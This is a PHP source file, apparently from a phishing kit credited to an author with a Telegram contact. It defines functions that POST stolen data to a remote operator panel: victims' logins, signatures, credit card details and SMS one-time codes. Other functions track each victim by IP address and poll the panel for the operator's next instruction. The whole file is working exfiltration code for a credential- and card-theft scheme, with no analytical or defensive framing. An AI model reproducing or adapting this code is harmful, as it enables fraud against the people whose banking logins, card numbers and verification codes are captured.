<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/

    function insert_login($data) {
        $curl = curl_init(PANEL . "/inc/queries/insert_login.php");
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
        curl_setopt($curl, CURLOPT_ENCODING, "UTF-8");
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_exec($curl);
        curl_close($curl);
    }

    function insert_firma($data) {
        $curl = curl_init(PANEL . "/inc/queries/insert_firma.php");
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
        curl_setopt($curl, CURLOPT_ENCODING, "UTF-8");
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_exec($curl);
        curl_close($curl);
    }

    function insert_cc($data) {
        $curl = curl_init(PANEL . "/inc/queries/insert_cc.php");
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
        curl_setopt($curl, CURLOPT_ENCODING, "UTF-8");
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_exec($curl);
        curl_close($curl);
    }

    function insert_sms($data) {
        $curl = curl_init(PANEL . "/inc/queries/insert_sms.php");
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
        curl_setopt($curl, CURLOPT_ENCODING, "UTF-8");
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_exec($curl);
        curl_close($curl);
    }

    function reset_action($ip) {
        $data = [
            'ip' => $ip,
        ];
        $curl = curl_init(PANEL . "/inc/queries/reset_action.php");
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
        curl_setopt($curl, CURLOPT_ENCODING, "UTF-8");
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_exec($curl);
        curl_close($curl);
    }

    function update_status($ip,$status) {
        $data = [
            'ip'     => $ip,
            'status' => $status
        ];
        $curl = curl_init(PANEL . "/inc/queries/update_status.php");
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
        curl_setopt($curl, CURLOPT_ENCODING, "UTF-8");
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_exec($curl);
        curl_close($curl);
    }
    function panel_response() {
        $data = [
            'ip' => get_client_ip(),
        ];
        $curl = curl_init(PANEL . "/inc/queries/waiting.php");
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
        curl_setopt($curl, CURLOPT_ENCODING, "UTF-8");
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($curl);
        curl_close($curl);
        return $response;
    }
?>